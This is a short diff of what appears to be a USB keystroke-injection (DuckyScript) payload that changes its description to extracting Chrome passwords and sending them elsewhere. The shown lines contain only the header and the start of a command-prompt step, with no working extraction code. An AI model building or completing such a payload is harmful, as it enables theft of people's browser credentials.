@@ -1,6 +1,6 @@
 REM TITLE Almost Gotcha!
 REM AUTHOR nimcool
-REM DESCRIPTION Extract Passwords to a Zipped File.
+REM DESCRIPTION Extract Chrome Passwords & Send Wherever
 
 REM Open Command Prompt
 DELAY 4000
